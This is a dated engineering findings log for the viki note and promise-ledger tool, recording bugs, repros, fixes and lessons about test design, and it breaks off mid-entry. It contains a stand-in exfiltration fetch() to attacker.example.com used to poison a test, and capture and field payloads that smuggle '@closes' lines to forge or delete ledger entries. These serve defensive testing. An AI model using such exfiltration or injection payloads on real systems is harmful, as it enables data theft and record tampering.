# FINDINGS.md

Surprising things discovered while building, with repro, in the spirit of
`FFI_RISK.md`. Newest first.

**Entries are dated snapshots.** A figure inside an entry describes the
tree as of that entry's date, not today. In particular `test/m1.sh` grew
from **54 to 90** assertions on 2026-08-13, so a `54 passed, 0 failed, 0
skipped` inside an older entry is that entry's history and not a current
expectation -- re-run the command before quoting the number. Where a later
measurement contradicts an entry outright, the correction is inserted into
that entry as a dated block quote rather than by rewriting it.

---
## "push/pull forks" is three claims, and only ONE of them is intrinsic

2026-08-29. `viki cache push/pull` shells out to `fossil uv add`, `uv sync` and
`uv export`, and this was recorded as a single blocker: "libfossilsee's v0 ABI
is read-only SQL, so push/pull must fork." Decomposed, the three legs have three
different blockers and they die on different days.

| leg | what it actually needs | fork required? |
|---|---|---|
| `uv export` | read + `decompress()` | **NO** -- in-process |
| `uv add` | a WRITABLE connection | yes today, by `fs_authorizer` |
| `uv sync` | the network sync protocol | **yes, intrinsically** |

**`unversioned_write()` is not what its name suggests.** It is `hname_hash()` +
`blob_compress()` + one `REPLACE INTO unversioned(...)` + `admin_log()` +
`db_unset("uv-hash")`. No artifact, no Merkle DAG -- consistent with SYNC.md's
"uv blobs are name-addressed with no hash in the protocol at all." So `uv add`
wants a *write*, not a subprocess, and it does not even strictly want zlib:
`encoding=0` is a legal stored form (Fossil picks it whenever compression saves
less than 20%) and Fossil reads both.

**The export leg's fork was never about uv at all.** It is the SUBPROCESS
TRANSPORT that cannot carry an embedded NUL -- and a SQLite database is NUL in
byte 9, so `fossil sql` truncates the cache immediately. In process there is no
such limit. Measured, on a 320,016-byte compressible binary stored at
`encoding=1` (`length(content)`=150,413):

```
in-process (libfossilsee SQL + decompress())   320016 bytes, byte-identical
subprocess (fossil sql, same query)                16 bytes  -- dies at the
                                                              first NUL, which
                                                              is "SQLite
                                                              format 3\0"
```

A 200,000-byte random blob (`encoding=0`) also round-trips byte-identical
in-process, so this is not an artifact of the compressed path.

**The wrong assumption it replaces:** that the whole push/pull path is blocked
on the same missing capability, so nothing there can improve until
libfossilsee grows sync. In fact the export fork is removable today on any peer
that loads the library, and only `uv sync` is genuinely not expressible as SQL.

**This is the substrate probe's first real catch** (`build/substrate-probe.sh`
S9), found the day it was written -- which is the argument for the probe rather
than for any particular result in it.

---
## `fossil unversioned cat` was never the only way to read a uv blob: SQL has decompress()

2026-08-29. `index_unversioned()` forked `fossil unversioned cat` once per
unversioned blob, and both CLAUDE.md and AGENTS.md called this an
**unavoidable** exception to the one-subprocess-per-class rule, on the grounds
that `unversioned.content` is zlib-compressed behind a 4-byte big-endian length
prefix when `encoding=1` and that `unversioned cat` "is the only extraction path
that does not require linking zlib".

**The wrong assumption it replaces:** that reading the blob in SQL would mean
linking zlib into viki. It does not. Fossil registers a `decompress()` SQL
function in `add_content_sql_commands()` (`sqlcmd.c:153`) -- the *same* call
that registers `content()`, which viki already depends on for five other
classes -- and it strips the length prefix itself. Both transports have it:
`fossil sql` calls `add_content_sql_commands()`, and so does libfossilsee
(`embed/fossilsee.c:221`). viki links no zlib either way.

Repro, on a 6,000-byte blob stored at `encoding=1`, `length(content)=73`:

```sh
fossil sql "SELECT length(CASE WHEN encoding=1 THEN decompress(content)
                               ELSE content END)
              FROM unversioned WHERE name='big.txt';"     # 6000
fossil unversioned cat big.txt | wc -c                    # 6000
```

Measured end to end with a fork-counting wrapper as `$VIKI_FOSSIL_BIN`, on a
repo holding 8 uv blobs, with `VIKI_FOSSILSEE_LIB` pointed at a nonexistent
path so every fork is visible:

```
before   unversioned cat forks 8    total forks per index run 17
after    unversioned cat forks 0    total forks per index run  9
```

All 8 blobs still indexed, chunk text byte-identical.

**A trap this ran into, and it is the one CLAUDE.md already warns about.** The
first measurement showed the *old* query and 8 forks against what I believed was
the rebuilt binary. `build/build.sh` had been run while the change was stashed
for an unrelated warning check, and `git stash pop` does not rebuild. The
fossilsee probe passed 22/0 against that stale binary, because it asserts the
two transports AGREE -- which they did, both being the old path. Check
`strings build/dist/viki` for a string unique to the change before believing
any measurement.

**The NUL exclusion moved into SQL**, exactly as `attach:` already does it,
because the subprocess transport cannot carry an embedded NUL. Blobs containing
one were already dropped by `looks_binary()` *without* being marked seen, so
excluding them in the `WHERE` preserves liveness behaviour exactly rather than
exposing them to `sweep_sources()`.

---
## Fossil's `finfo` omits every file deletion on two of its three routes

2026-08-29. `json_finfo.c` computes `(mlink.fid==0) AS isDel` and passes it to
`json_artifact_status_to_string()`, which can return `"added"`, `"modified"` or
`"removed"`. The same query then inner-joins `blob b` on `b.rid=mlink.fid` --
and a deletion has `fid==0` while no blob has `rid==0`, so the join removes
exactly the rows `isDel` exists to flag. The column is dead code and `"removed"`
is unreachable from that route.

**The wrong assumption it replaces:** that "`fossil json finfo` does not report
deletions" was a design limit of the JSON API. It is a two-line bug.

**And a correction to my own first reading of it, made the same day.** I wrote
here that the CLI `fossil finfo` got this right and only the JSON route was
wrong, citing the `mlink.fid>0 OR NOT EXISTS(...)` clause at `finfo.c:453`.
That clause is in **`finfo_page()`** -- the *web* `/finfo` page. The CLI's own
log-mode query (`finfo.c:223`) carries the identical inner join and drops
deletions exactly like the JSON route. Caught by running `fossil finfo f.txt`
instead of restating the claim, after it had already been written into an
upstream report. Three routes onto one file's history:

| route | function | deletions |
|---|---|---|
| `/finfo` (web) | `finfo_page()`, `finfo.c:453` | **reported** |
| `fossil finfo` (CLI) | `finfo_cmd()`, `finfo.c:223` | omitted |
| `/json/finfo` | `json_finfo.c:80` | omitted |

Each route's own query, run verbatim against the repro repo below: the CLI
query returns `add, mod`; the web page query returns `add, mod, del` with
`isDel=1`. The web page having been correct all along is the strongest
evidence that omitting deletions was never the intended behaviour.

Repro -- one file added, modified, then removed:

```sh
fossil init r.fossil && mkdir co && cd co && fossil open ../r.fossil
echo one > f.txt && fossil add f.txt && fossil commit -m add
echo two >> f.txt                    && fossil commit -m mod
fossil rm f.txt                      && fossil commit -m del
fossil json finfo --name f.txt       # two rows: added, modified
fossil finfo f.txt                   # also omits the deletion
```

The fix is `LEFT JOIN blob b ON b.rid=mlink.fid` in place of the inner join;
`build/patches/fossil-json-finfo-deletions.patch` in fossil-see carries it for
the JSON route, and the rebuilt binary returns the third row with
`state="removed"`. `finfo.c:223` takes the identical change and is deliberately
not patched: the CLI *prints* `artifact: [%S]` from a column that is NULL on a
deletion, and what such a row should display is a decision for upstream. On a deletion
row `b.uuid` and `b.size` are NULL, `json_new_string()` maps NULL to NULL, and
`cson_object_set()` unsets the key -- so the row carries `state` and no `uuid`,
which is correct because a removal names no content.

**Live consequence for viki:** any provenance work that reads file history
through the JSON API sees additions and modifications and is blind to
removals -- i.e. it cannot tell "this file never existed" from "this file was
deleted", which is the distinction provenance is for.

---
## A wiki page cannot carry the text/calendar mimetype, and that gate is load-bearing

2026-08-29. `wiki_filter_mimetypes()` (`wiki.c:176`) allowlists only `azStyles`
plus `text/x-markdown` and `text/plain`; **anything else is silently rewritten
to `text/x-fossil-wiki`** with no error and no warning. It is the single
chokepoint for all 13 call sites -- CLI, `/wikiedit`, the JSON API, technotes,
and the search indexer.

Measured both directions on the same scratch repo, reading the `N` card
straight out of the artifact:

```
patched fossil    fossil wiki create Cal cal.ics --mimetype text/calendar
                  -> N text/calendar
stock fossil      same command
                  -> no N card at all (silently text/x-fossil-wiki)
control           --mimetype text/plain      -> N text/plain
                  --mimetype text/x-markdown -> N text/x-markdown
```

The controls matter: they prove the gate is what drops `text/calendar`, not a
broken invocation. **Read the `N` card by artifact hash, not by rid** --
`fossil artifact` takes a hash, and passing a `tagxref.rid` to it reports "no N
card" for *every* page, which is how this first measured as "the mimetype is
never preserved for anything".

**The patch was written, verified, and then deliberately backed out**, which is
the finding worth keeping. Warren's call: *"fossil is not calendar aware, an
honest viki feature."* Teaching the substrate one content type it has no use
for is exactly the SCOPES violation the placement test catches -- Fossil is L0
and holds bytes without an opinion about them.

**So viki must not mark calendar-ness in the artifact's `N` card.** That field
is not writable without patching Fossil, and it is the wrong place regardless:
calendar-ness is viki's projection to compute (D-2), not Fossil's to store.
`fossil-see`'s abandoned `feature/calendar` branch reached the same patch and
the same "do not add it to `azStyles`" conclusion independently, and left it
uncommitted for the same reason.

---
## The vector and literal legs could not add a document, only re-rank BM25's

2026-08-27. `find_or_add()` returns NULL once the candidate pool is full
(`viki_ask.c:82`), and `run_fts()` ran first and filled it. So on any corpus
where the OR-of-terms MATCH selects at least a poolful of distinct chunks --
which `viki_ask.h` itself calls the normal case, "a median of 244 of 245" --
the literal and vector legs could only REORDER what BM25 had already chosen.
They could not introduce a document BM25 missed. One defect on three surfaces,
since `viki_ask_query()` is the single implementation behind the CLI,
`/api/ask` and the wasm edge.

Measured on a corpus of one semantically-relevant document plus N lexical
fillers that match the query's words:

```
85 fillers, pre-fix    best cosine 0.2198   target absent at any --k
85 fillers, post-fix   best cosine 0.3841   vector leg reaches its own candidates
```

**The reported confidence was wrong too.** `viki_ask.h` argues `--min-cos` is
applied to the raw cosine because that is "comparable across corpora, unlike
bm25()'s corpus-dependent magnitude". It was being computed over whatever BM25
had put in the pool, so it was not comparable to anything.

Fixed with a per-leg budget (`VIKI_LEG_BUDGET` 40, pool 150) instead of one
first-come array.

### What I could not establish, stated plainly

**The aggregate benefit is unproven on the eval corpus.** Same corpus
(`fp 1b1e3c962c1e8cad`), DEV split before and after: recall@1 0.323,
recall@5 0.516, recall@k 0.677, MRR 0.398 -- **byte-identical**. That is the
honest expected result: 245 chunks cannot starve an 80-slot pool the way 300
documents can. TEST moved (recall@5 0.667 -> 0.750) but TEST is not for
deciding, per the rule this file already carries.

**And I could not build a stable assertion for it.** The obvious one -- best
cosine must not depend on how many lexical fillers exist -- holds on BOTH
binaries in a second corpus, so it does not discriminate. The defect is real by
code reading (`find_or_add` returns NULL when full, run_fts goes first) and by
the starve2 repro above; it is corpus-dependent enough that no fixture I built
fails reliably. **No assertion shipped**, rather than a green one that proves
nothing.

---
## A stack overflow in index_tickets(), from misreading what snprintf returns

2026-08-27. `snprintf` returns the length it WOULD have written, and
`index_tickets()` accumulated that:

```c
char buf[8192];
off += snprintf(buf + off, sizeof(buf) - (size_t)off, ...);
```

A long ticket title drives `off` past `sizeof(buf)`, so the next call writes
through an out-of-bounds `buf + off` with a size argument that has underflowed
to about `SIZE_MAX`. Measured: a ~9 KB title wrote 877 bytes past an 8192-byte
stack array and silently dropped the ticket comment from the index; a 200 KB
title killed `viki index` with **SIGSEGV**, no other output.

Fixed with a buffer sized from the actual field lengths, the way
`index_ticket_changes()` already does. Clamping `off` would have stopped the
overflow and kept the silent 8 KB truncation, which that function's own comment
calls "invisible and total" -- so clamping was the wrong repair even though it
is the smaller diff.

Verified: 200 KB title now exits 0 and the comment is indexed.

---
## A NUL byte in one attachment could delete the next one

2026-08-27. `fossil sql` prints a frame as a **C string**, so a payload is
truncated at its first NUL -- while the declared count is the full BLOB length.
The count then runs past the truncated body into whatever follows.

The bad case is not "one attachment is lost". When the over-long count lands on
a later newline the parser **RESYNCS**, swallows the following artifact's
record, and still reaches `#viki-eof` -- so the class reports itself
**AUTHORITATIVE**, and `sweep_sources()` deletes the swallowed attachment's
live row while `gc_orphan_chunks()` reaps its chunks. Exit 0 throughout.

It also broke an equivalence claim: the in-process `libfossilsee` path passes an
explicit length and never truncates, so **the two transports
`build/fossilsee-probe.sh` certifies equivalent built different corpora.** That
probe only ever attached a TEXT file.

Fixed by excluding NUL-bearing attachments in SQL
(`instr(cast(content(a.src) AS BLOB), x'00') = 0`) rather than by encoding
them: such an attachment is binary and `looks_binary()` would reject it anyway,
so the class stays authoritative and nothing indexable is lost.

### What I could NOT assert, and did not pretend to

The end-to-end corruption depends on the bad count landing exactly on a
newline, so it depends on the byte lengths of surrounding records and on
attachment mtime ordering. It reproduces in a crafted scratch repo and **does
not reproduce in `fossilsee-probe.sh`'s fixture.** I wrote three assertions
against it and they passed identically against a binary WITHOUT the fix, so
they were deleted rather than shipped. What remains is the one invariant that
holds on any input -- the two transports must agree -- plus a binary attachment
in the fixture so that assertion has something to be about.

Recording the deletion because it is the more useful half: three green
assertions that cannot fail would have made this look permanently fixed.

---
## 28 green assertions proved the ICS parser and never ran the read surface

2026-08-27, the same day the shredder landed. A hunt agent found five defects
in it, four of them behind a fully green `build/cal-probe.sh`. **Every
assertion tested the PARSER; not one ran `--from`, `--to` or `--json`** -- the
surface a morning brief would actually consume.

Two of the five make the feature useless rather than merely wrong:

### The date filter answered nothing for the format it documents

Stored times are RFC 5545 **basic** (`20260828T140000`); a person, and this
command's own usage string, writes **extended** (`2026-08-28`). `-` is 0x2D and
sorts below every digit, so `"20260828T140000" <= "2026-12-31"` is FALSE and a
`--to` bound excluded the whole calendar.

```
$ viki calendar events --all                              -> 1 event
$ viki calendar events --from 2026-08-01 --to 2026-12-31   -> 0 events
```

A filter that answers "nothing" for its documented format is worse than one
that errors, because **an empty day looks like a quiet day**. Both sides are
now compared in one alphabet, and a date-only `--to` covers its whole day --
the same end-of-day rule `risk_of()` needed for `@due`, arrived at
independently in a second place, which is a hint it should have been a shared
helper the first time.

### A VALARM's properties became the meeting's

`VALARM` lives *inside* a `VEVENT` and carries its own `SUMMARY`, `DURATION`
and `ATTENDEE`. Capture was never suspended for a nested sub-component, so an
Apple/Google EMAIL alarm put its notification robot on the attendee list and
its `DURATION:PT15M` became the event's -- **a one-hour appointment read as
fifteen minutes.** Nested components are now skipped to their matching END.

### Three more

- `--json` interpolated `SUMMARY` and `UID` with raw `%s`. An `.ics` is
  attacker-controlled the moment a feed URL is, so a quote in a SUMMARY
  fabricated fields. Now through `viki_json_escape()` -- the second surface
  this week to need the escaper that already existed and was private.
- `SEQUENCE` was parsed with `atoi()`, which cannot report failure: a
  non-integer became 0 (a *valid* sequence, so it silently loses every RFC 5546
  resolution) and an out-of-range value was undefined behaviour, observed as
  -1, which wins over everything. `strtol` with a full check, and it says so.
- Attendees past `CAL_MAX_ATT` were dropped at exit 0, so a 70-person all-hands
  stored as a 64-person one. It warns now.

K1-K10b. 8 of 12 fail against the pre-fix binary; K3b, K6 and K10b are the
controls that stop the fixes being satisfied by dropping data instead.

---
## The forgery fix was defeated by padding: column 0 of a CHUNK is not column 0 of a LINE

2026-08-27, hours after the fix below claimed to close it. Found by a hunt
agent, reproduced immediately. **The fix was writer-side and the bug is in the
reader.**

`note_parse_file()` reads with `fgets(line, 2048, f)`. A line longer than the
buffer arrives as SEVERAL chunks, and byte 0 of every chunk after the first is
mid-line -- but the parser treated it as column 0, where `@` is structural.
So the writer's neutralisation is irrelevant: pad the body to exactly 2047
bytes and the reader re-splits it wherever it likes.

```
$ viki capture "ship the grant budget to renee" --type task --due 2026-08-30
$ viki capture "$(python3 -c 'print("x"*2047,end="")')@closes 20260827-212732-427485"
$ viki promises --all
  (nothing owed)                       <- the real promise is gone
$ viki sql "SELECT note_id, closes FROM viki_note"
  20260827-212732-566774|20260827-212732-427485    <- injected @closes landed
```

**Three faces, one root cause**, and the third is the worst:

1. The padding defeat above.
2. `emit_field()` on the `viki structure` path never got `write_field()`'s
   newline guard at all, so `--place "ranch<newline>@closes <id>"` injected a
   line with **no padding trick** -- and `/api/structure` reaches it over HTTP.
   I fixed one writer and missed its sibling.
3. `structure_write()` hit the same boundary and **PERMANENTLY DELETED the
   user's own words** from `captures/*.md`: the continuation chunk was consumed
   as a field line, dropped from the body, and never re-emitted. 40 bytes gone
   from the file D-10 calls truth.

Fixed in the READER (`bAtLineStart`, in both loops), because `captures/*.md` is
hand-edited too -- a writer-side rule only protects text viki itself wrote.
`emit_field()` now goes through `write_field()`: one writer, one rule.

### The lesson about my own testing

The F-series I wrote for the original fix used SHORT payloads, so every `@` sat
at a real line start. It could not see this. **A test built from the same
mental model as the code shares the code's blind spot** -- which is why the
hunt that found this was told to attack the code rather than review it.

G1/G2/G3b/G3c. And G3 itself was VACUOUS on first writing: it grepped for a
marker that survives whether or not the tail of the line is deleted, so it
passed against the very binary that destroys the text. It asserts on BYTES now.
50/5 against the pre-fix binary.

---
## One quote in a note blanked the entire morning brief

2026-08-27. `viki coverage --json` printed `"source":"%s"` with no escaping, and
an INFERRED channel name is raw note text -- whatever sat between the first
brackets. So an ordinary capture:

```
$ viki capture '[he said "no"] pasture gate is open'
$ viki coverage --json
  [{"source":"he said "no"","last_seen":...     <- invalid JSON
```

`assistant/brief.sh` parsed that with `except Exception: rows = []` and printed
**"nothing at all -- no captures, no channels"** while three live channels,
including a DECLARED one, sat in the cache. Exit 0, no warning.

**Two bugs, and the second is the one that matters.** The escaping is a
formatting error. Reporting *"I could not read it"* as *"there is nothing"* is
a coverage lie, on the surface where it does the most damage -- §2.5 exists
precisely to stop a channel that silently stopped being read from looking like
a quiet day.

A correct escaper already existed (`sql_json_escape` in `viki_db.c`) and was
private; it is now `viki_json_escape()` and shared, because a second copy is
how the two surfaces came to disagree. The brief now names the parse error and
says explicitly that it is not the same as having no channels.

G4-G7, with G5 as the control that the offending channel is still REPORTED
rather than dropped to make the JSON parse.

---
## Text somebody else wrote could delete a promise from the ledger

2026-08-27. Found by an adversarial verifier reviewing a parked MCP branch,
which reported the defect as living in SHARED code rather than in the branch.
Reproduced against `main` immediately, and it was live there.

`note_parse_file()` gives `'@'` in column 0 structural meaning: it starts a
field, and `@note` additionally ENDS the previous block. `viki capture` wrote
its text with `fprintf(f, "%s\n\n", zText)` -- verbatim.

**Captured text is not trusted.** The Chrome reader POSTs whatever a Facebook,
Discord, D2L or Outlook message happened to say, and an MCP client posts
whatever it was told to.

```
$ viki capture "ship the grant budget to renee" --type task --due 2026-09-01
$ viki capture "hey did you see this
@note forged-000001
@type task
@closes 20260827-195822-674744
nothing to do here"

$ viki promises --all
         (no due)   mine   nothing to do here
                    forged-000001
$ ...and "ship the grant budget to renee" is GONE.
```

A message a stranger wrote forged a promise **and silently retired a real
one**. A ledger that loses an obligation because of something someone else
typed is the worst failure this product has; the whole premise is that it can
be believed.

### Two vectors, and a body-only fix passes its own test

The obvious repair escapes the BODY. It is not enough -- a FIELD value carrying
a newline opens a content line without touching the body at all:

```
viki capture "innocent text" --place "$(printf 'ranch\n@closes <id>')"
```

Both are closed: `write_body()` prefixes a space to any body line starting
`@` (the parser only treats column 0 specially, so a space demotes it to
text), and `write_field()` stops at the first newline.

**A leading space rather than a backslash escape**, deliberately: an escape
needs a matching un-escape in a parser that hand-edited `captures/*.md` also
feed, and a rule a human editing that file must remember is a rule that will be
got wrong.

### The controls are half the point

F1-F3 assert the attack fails. **F4 asserts the hostile text was still
STORED** -- this is neutralisation, not refusal, and a fix that dropped the
note would pass F1-F3 while losing the observation, which is the other way to
be wrong. F5 asserts a legitimate `--closes` still retires a promise, so F1-F3
cannot be satisfied by breaking supersession outright. F1-F3 fail against the
pre-fix binary (36/3); both controls pass on both.

---
## An unvalidated @due did not fail to sort -- it sorted WRONG, toward anxiety

2026-08-27. Found by a v1 audit agent, reproduced before acting. `@due` was
never validated anywhere, and every risk decision in `viki_note.c` is a
lexicographic comparison against an ISO instant. Lexicographic order is
chronological ONLY for ISO input, so a non-ISO date was not ignored -- it was
misclassified:

```
@due 08/28/2026    (TOMORROW, US format)   ->  OVERDUE     because "0" < "2"
@due next Tuesday                          ->  sorted as "next Tuesd", "later"
1 overdue, 0 due today, 2 later            <-  confidently wrong
```

**A promise due tomorrow read as already broken.** That is the ledger wrong in
the direction of anxiety, which `build/promise-probe.sh`'s own header names as
the thing the product exists to remove -- the second instance of that exact
failure in two days, after the date-only comparison bug.

### Why it matters more now than last week

**This is the trap calendar ingest walks into.** An ICS or calendar adapter
emitting a non-ISO date -- `08/28/2026` is what a US-locale export produces --
would have generated a phantom OVERDUE every morning, in the brief, with
nothing on screen explaining why. The ICS shredder landed the same day; this
was found before anything was wired to write `@due` from it.

### The fix, and why undated rather than rejected

An unparseable due becomes **undated, loudly**. Keeping it makes the ledger
confidently wrong; dropping the note silently makes a dated promise vanish
while the footer ("undated promises are not shown") gives the wrong reason for
its absence. Undated is the honest reading of "I cannot tell when", the ledger
already has that state, and a warning names the note and the value.

P15-P19 in `build/promise-probe.sh`. P19 is the control that stops the other
four being satisfied by "nothing is ever due". Four of the five fail against
the pre-fix binary (30/4), measured.

---
## The coverage channel list can be invented by anyone typing a bracket

2026-08-27. Same audit, reproduced, **not fixed** -- it changes a documented
decision and that is Warren's call.

`viki coverage` derives channel identity from a `"[name] "` prefix on note
text, which is what the browser reader writes. `viki_note.h` argues the design
explicitly: *"COVERAGE IS DERIVED, NOT REPORTED BY THE READER ... keeps the CLI
honest without coupling it to a browser extension it should know nothing
about."* The reasoning is sound; the derivation cannot tell a reader's prefix
from a human's bracket.

```
$ viki capture "[TODO] fix the gate latch"
$ viki coverage
  captured here   ...  1 note(s)
  facebook        ...  1 note(s)
  TODO            ...  1 note(s)     <- a channel that does not exist
```

`assistant/brief.sh` consumes `viki coverage --json` and prints a per-channel
staleness list, so a phantom channel appears in "WHAT I CAN SEE" reading as
freshly covered. That is the coverage lie SS 2.5 exists to prevent, arriving
through the mechanism built to prevent it.

### Fixed 2026-08-27, and the first fix I proposed was wrong

I first proposed recording **which DOOR** the capture came through -- CLI vs
`/api/capture`. That does not work, and noticing why is the useful part: the
door distinguishes HTTP from CLI, not *which channel*. The Chrome reader posts
Facebook, Discord, D2L and Outlook through the same door, so it yields a
channel named "http", which answers none of the questions coverage exists for.

The producer has to **declare** itself. `viki_note.h` argued against exactly
that -- *"derived, not reported ... keeps the CLI honest without coupling it to
a browser extension it should know nothing about"* -- and that argument is
weaker than it reads: viki already accepts `type`, `place`, `who`, `due` and
`state` from the same producer as opaque strings. A `channel=discord` is not
more coupling than `place=ranch`; viki does not know what Discord IS in either
case, it groups by the label.

So: `viki_note.channel`, `viki capture --channel`, `/api/capture?channel=`, and
the reader passes `msg.source` instead of relying on its text prefix. **The
prefix is kept** -- it is provenance a human and a structuring agent both read
-- but coverage no longer has to guess from it.

**The bracket survives as a MARKED fallback rather than being dropped.** Every
note captured before this has no declared channel, and dropping the fallback
would have silently shrunk what viki claims to see -- the opposite failure and
just as dishonest. `viki coverage` prints `(inferred from text)` and `--json`
carries `"declared": false` as a FIELD, not a decorated name, so a client
parsing `source` cannot start receiving marker words it cannot tell from a
channel name -- the same rule `/api/ask` follows for the fragment markers.

**The judgment went to `assistant/`, where it belongs.** viki reports declared
vs inferred and rules on neither. The brief SHOWS an inferred channel (hiding
it would be its own coverage lie) and never puts one on the SIGN IN list,
because sending someone to log in to "TODO" is how a brief stops being
believed.

### What that broke, and it is worth recording

Excluding inferred channels from SIGN IN made **B5 fail** -- an existing
assertion that a stale channel is named in a bounded sign-in list. Its fixture
was a bracketed `[teams]` capture, i.e. legacy-shaped, so my rule killed the
sign-in feature for every note the old reader wrote. The fixture now declares
its channel, which is what the real reader does as of this change; in practice
the list repopulates the first time the updated reader runs. Had I only run the
new assertions I would have shipped that.

H1-H7. H1-H4 fail against the pre-change binary (38/8); H7 is the control that
the inferred channel still carries its note count, so the fix cannot be
satisfied by suppression.

---
## I tuned two parameters against a metric that includes the held-out split

2026-08-27, self-reported. Warren pointed at commit `4292a0a`, which reverted a
round of ranking work. Its first and most serious reason:

> *"It cited HELD-OUT recall@1 and MRR in shipped source as the justification
> for keeping a change -- model selection on the test set, which invalidates the
> split for every future round."*

**I did the same thing on 2026-08-26, twice.** The overlap sweep (0/5/10/20) and
the candidate-pool sweep (40/80/160) were both decided by reading
`ALL indexed-answer queries`, which is n=43 = DEV 31 + TEST 12. I also quoted
held-out figures in commit messages as supporting evidence for keeping each
change. `test/retrieval-queries.tsv` holds 31% out precisely so a later round
has an uncontaminated estimate, and selecting on it spends that.

### Re-derived on DEV alone, which is what should have been reported

| overlap | dev recall@1 | dev MRR | | pool | dev recall@5 | dev recall@k | dev MRR |
|---|---|---|---|---|---|---|---|
| 0 | 0.226 | 0.337 | | 40 | 0.452 | 0.645 | 0.386 |
| 5 | 0.290 | 0.360 | | **80** | **0.516** | **0.677** | **0.398** |
| **10** | **0.323** | **0.386** | | 160 | 0.484 | 0.645 | 0.393 |
| 20 | 0.290 | 0.382 | | | | | |

**Both choices survive**: overlap 10 and pool 80 win on the tunable split on
their own. The decisions stand; the *justification* was wrong, and that is a
distinction worth keeping rather than quietly repairing.

### What is actually spent

The held-out numbers reported for these two changes are no longer clean
estimates OF THOSE CHANGES -- they were read while choosing. They remain valid
as a description of what the shipped configuration does. The split is not burned
for future, independent questions; it is burned for "was overlap 10 the right
pick" and "was pool 80 the right pick".

### The rule, since this file is where it will be looked for

**Tune on DEV. Report TEST once, after the choice is fixed, and never revise the
choice afterward.** A number that influenced a decision is not evidence about
that decision. `4292a0a` established this; it took a pointer from Warren for it
to reach a later round, which is the argument for it living here rather than
only in a commit message.

---
## viki printed the right answer and then died in exit(), on encrypted repos only

2026-08-26. Found by an agent repairing something else, reproduced here before
acting. **A live crash on `main`, in the configuration that matters most.**

`viki index` (and `when`/`since`) exited **139 (SIGSEGV)** whenever BOTH held:

- the repo is **encrypted** -- a plaintext repo never reaches `sqlite3Codec`;
- **`VIKI_FOSSILSEE_LIB` is set**, i.e. the in-process path CLAUDE.md prefers.

That is every real tribe, on the recommended configuration.

### Cause

`atexit` handlers run LIFO. `main()` registered `viki_fossilsee_shutdown` as
its **first statement**, before `viki_fossilsee.c` ever `dlopen()`s the
library. A `dlopen`'d image registers its own terminators at load time --
LibreSSL's among them, which is what tears down the crypto state SQLCipher's
codec hangs off -- so those sat ABOVE viki's handler and ran FIRST. viki's
handler then called `fossilsee_close()` -> `db_close()` -> `sqlite3_exec()`,
the pager re-read a page, and `sqlite3Codec` dereferenced a finalised context.

Fixed by registering the handler where the library is opened
(`register_shutdown_once()`), so viki's close sits on top of everything the
library brought with it and runs while the library is still whole.

### Why every probe stayed green through it

**They compare OUTPUT. None read an exit status.** The answer was computed and
printed correctly; the process died afterwards. A terminal run looked perfect.

And the second-order effect is worse than the status: **stdout is block
buffered when redirected**, so the crash beat stdio's flush and a redirected
run lost its output entirely -- measured at **0 bytes**. Which is how the
agent's first probe run scored 14/43 with empty capture files, a result that
looks like a broken probe rather than a crashing binary.

```
MAIN binary, encrypted repo, VIKI_FOSSILSEE_LIB set:  rc=139, stdout 0 bytes
same binary, lib unset:                               rc=0
same binary, plaintext repo, lib set:                 rc=0
```

`build/fossilsee-probe.sh` E1/E2 now assert the exit status and that the report
survives a redirect. E1 fails against the pre-fix binary (20/1), measured.
`VIKI_BIN` is honoured by that probe now too -- without it, the "does this fail
against the old build?" check silently re-tests the current one, which it did
on my first attempt.

---
## The assertion that the Chrome reader can only talk to loopback could not fail

2026-08-26. Found by a v1 audit agent, reproduced independently before acting.
This is the most serious defect recorded in this file, because of what the
component does: the reader observes Warren's Facebook, Discord, D2L and Outlook
— private correspondence — and R6 is the single assertion standing between
"observes" and "ships somewhere".

`build/reader-probe.sh` stripped comments with `sed 's://.*::'` before grepping
for network destinations. That treats the `//` in `https://host/path` as the
start of a comment and truncates the line at `https:`, so **no host ever
reached the grep** and the host list was always empty.

### Repro

```
$ cp -R edge/chrome /tmp/r6 && cat >> /tmp/r6/background.js <<'EOF'
fetch("https://attacker.example.com/collect",{method:"POST",body:"x"});
EOF
$ # run R6's exact pipeline over /tmp/r6
R6 PASS   <-- an extension that POSTs private messages to an attacker
```

Confirmed on the real tree too: appending that line to `edge/chrome/background.js`
left the suite at `PASS=14 FAIL=0`.

### The wrong assumption it replaces

That a comment stripper is harmless preprocessing. It is not, when the thing
being searched for contains the comment delimiter. `R1`–`R5` (`.click`,
`innerHTML`, …) worked precisely because their patterns contain no `//`, which
is why the file looked trustworthy.

### Fixed, and made self-proving

The scheme is protected before comments are stripped (`://` → sentinel → strip
→ restore). More importantly **R6b** now runs the check against a copy of the
extension poisoned with a real exfil `fetch()` on every run and asserts it
FIRES. An assertion about exfiltration that has never been shown to fail is not
evidence of anything. Verified both ways: R6 goes red on a poisoned tree, green
on the real one.

A URL written inside a comment can now fail R6. That is the right direction to
err for a component handling private correspondence.

---
## The morning brief showed only what was ALREADY late, which inverts what it is for

2026-08-26. Same v1 audit. `assistant/brief.sh` filtered the ledger with
`grep -vE '^(       |$)'` -- drop lines beginning with seven spaces. That was
written to remove the note-id continuation line. But `viki_note.c` prints rows
as `%-8s %-10s %-12s %s`, so a promise with **no risk marker** begins with NINE
spaces, matched the filter, and was deleted.

```
AT RISK
0 overdue, 0 due today, 1 later      <- the promise itself is gone
```

A promise due in three days did not appear at all. The brief therefore listed
only what was already OVERDUE or due TODAY -- **a warning after the miss**,
where VIKIVERSE_V1 2.4 asks for the warning before it. The one feature the
brief exists to provide was the one it did not have.

Fixed by filtering on STRUCTURE rather than indentation: a promise row has
several fields, the continuation line is a single indented token, and the
ledger's coverage footer is dropped because the brief states its coverage in
its own words. B9/B10 assert both halves; B9 fails against the old brief.

### And the probe could not have caught it

`build/promise-probe.sh` called `sk` at two sites and **never defined it**. A
skipped assertion produced `sk: command not found` on stderr and vanished from
the tally, so a run without `sqlite3` printed `PASS=21 FAIL=0`, exit 0, with
nothing saying three assertions had not run. CLAUDE.md's own doctrine -- "a
skipping run still exits 0; never read exit status alone, read the N passed,
N failed, N skipped line" -- is implemented in `test/m1.sh` and was missing
here. `sk()` is now defined and the summary carries `SKIP=`.

---
## A promise due today, written as a bare date, read OVERDUE all day

2026-08-26. Same audit. `risk_of()` compared the due string against `zNow` with
`strcmp()`, and `zNow` is a full instant:

```
strcmp("2026-08-26", "2026-08-26T17:56:46.930135Z") < 0   -> OVERDUE
```

The bare date is a PREFIX of the instant, so it sorts first, and every
date-only promise was overdue from 00:00 of the day it was owed. Measured with
two promises owed the same day:

```
OVERDUE  2026-08-26  mine  date-only due, owed TODAY
